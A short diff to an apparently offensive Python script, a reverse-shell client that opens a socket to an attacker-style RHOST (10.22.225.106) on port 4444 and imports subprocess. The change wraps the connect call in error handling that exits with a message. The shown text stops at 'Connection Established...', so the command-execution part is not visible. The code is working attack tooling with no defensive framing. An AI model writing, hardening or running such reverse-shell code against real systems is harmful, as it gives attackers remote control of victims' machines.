@@ -1,12 +1,16 @@
-import socket as sk, subprocess
+import socket as sk, subprocess, sys
 
 sk = sk.socket(sk.AF_INET, sk.SOCK_STREAM)
 
 RHOST = "10.22.225.106"
 RPORT = 4444
 
-print(f"Connecting to {RHOST}:{RPORT}...")
-sk.connect((RHOST, RPORT))
+try:
+    print(f"Connecting to {RHOST}:{RPORT}...")
+    sk.connect((RHOST, RPORT))
+except:
+    print("Host is probably down or Connectivity issues!")
+    sys.exit(1)
 
 print("Connection Established...")
 
